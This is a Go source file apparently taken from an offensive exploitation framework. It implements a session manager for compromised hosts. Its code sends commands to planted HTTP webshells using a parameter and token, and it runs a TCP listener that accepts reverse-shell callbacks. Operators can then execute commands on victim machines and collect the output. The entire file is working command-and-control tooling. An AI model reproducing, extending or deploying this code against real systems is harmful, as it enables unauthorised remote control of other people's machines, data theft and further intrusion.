// Package shell manages interactive shell sessions: HTTP webshells and
// reverse-connect TCP sessions. Sessions are registered by exploit/backdoor
// modules and interacted with from the TUI console.
package shell

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// Session is one live shell.
type Session struct {
	ID        string
	Kind      string // "webshell" or "reverse"
	Target    string // shell URL or remote addr
	Token     string
	Param     string // command param for webshells ("c", "cmd", ...)
	Conn      net.Conn
	CreatedAt time.Time
	mu        sync.Mutex
}

// Manager tracks live sessions.
type Manager struct {
	mu       sync.RWMutex
	nextID   int
	sessions map[string]*Session
	order    []string
}

var mgr = &Manager{sessions: map[string]*Session{}}

// M returns the global session manager.
func M() *Manager { return mgr }

// RegisterWebshell adds an HTTP webshell session.
func (m *Manager) RegisterWebshell(target, token, param string) *Session {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.nextID++
	s := &Session{
		ID:        fmt.Sprintf("shell-%d", m.nextID),
		Kind:      "webshell",
		Target:    target,
		Token:     token,
		Param:     param,
		CreatedAt: time.Now(),
	}
	m.sessions[s.ID] = s
	m.order = append(m.order, s.ID)
	return s
}

// RegisterReverse adds a TCP reverse session.
func (m *Manager) RegisterReverse(conn net.Conn) *Session {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.nextID++
	s := &Session{
		ID:        fmt.Sprintf("rev-%d", m.nextID),
		Kind:      "reverse",
		Target:    conn.RemoteAddr().String(),
		Conn:      conn,
		CreatedAt: time.Now(),
	}
	m.sessions[s.ID] = s
	m.order = append(m.order, s.ID)
	return s
}

// Get retrieves a session by ID.
func (m *Manager) Get(id string) (*Session, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	s, ok := m.sessions[id]
	return s, ok
}

// List returns sessions in registration order.
func (m *Manager) List() []*Session {
	m.mu.RLock()
	defer m.mu.RUnlock()
	out := make([]*Session, 0, len(m.order))
	for _, id := range m.order {
		if s, ok := m.sessions[id]; ok {
			out = append(out, s)
		}
	}
	return out
}

// Close removes and closes a session.
func (m *Manager) Close(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if s, ok := m.sessions[id]; ok {
		if s.Conn != nil {
			s.Conn.Close()
		}
		delete(m.sessions, id)
	}
	for i, v := range m.order {
		if v == id {
			m.order = append(m.order[:i], m.order[i+1:]...)
			break
		}
	}
}

// Exec runs a command through the session and returns combined output.
func (s *Session) Exec(ctx context.Context, cmd string) (string, error) {
	switch s.Kind {
	case "webshell":
		return s.execHTTP(ctx, cmd)
	case "reverse":
		return s.execTCP(cmd)
	default:
		return "", fmt.Errorf("unknown session kind %q", s.Kind)
	}
}

func (s *Session) execHTTP(ctx context.Context, cmd string) (string, error) {
	u := s.Target
	sep := "?"
	if strings.Contains(u, "?") {
		sep = "&"
	}
	u = fmt.Sprintf("%s%s%s=%s&t=%s", u, sep, url.QueryEscape(s.Param), url.QueryEscape(cmd), url.QueryEscape(s.Token))
	req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
	if err != nil {
		return "", err
	}
	resp, err := (&http.Client{Timeout: 20 * time.Second}).Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b := make([]byte, 0, 4096)
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		b = append(b, buf[:n]...)
		if err != nil || len(b) > 1<<20 {
			break
		}
	}
	return string(b), nil
}

func (s *Session) execTCP(cmd string) (string, error) {
	if s.Conn == nil {
		return "", fmt.Errorf("session closed")
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := s.Conn.Write([]byte(cmd + "\n")); err != nil {
		return "", err
	}
	// Drain output until 400ms idle or 5s total. Reading directly from the
	// conn (no per-call bufio) so buffered data is never lost between Execs.
	var sb strings.Builder
	buf := make([]byte, 4096)
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		s.Conn.SetReadDeadline(time.Now().Add(400 * time.Millisecond))
		n, err := s.Conn.Read(buf)
		sb.Write(buf[:n])
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				if sb.Len() > 0 {
					break // idle pause after receiving some output
				}
				continue // keep waiting for first bytes
			}
			break // conn closed or fatal read error
		}
		if sb.Len() > 1<<20 {
			break
		}
	}
	return sb.String(), nil
}

// StartListener begins a TCP reverse-shell listener; callbacks register as
// sessions. Returns the bound address and a stop func.
func StartListener(ctx context.Context, port int, onConnect func(*Session)) (string, func(), error) {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return "", nil, err
	}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return // listener closed
			}
			s := mgr.RegisterReverse(conn)
			if onConnect != nil {
				onConnect(s)
			}
		}
	}()
	stop := func() { ln.Close() }
	return ln.Addr().String(), stop, nil
}
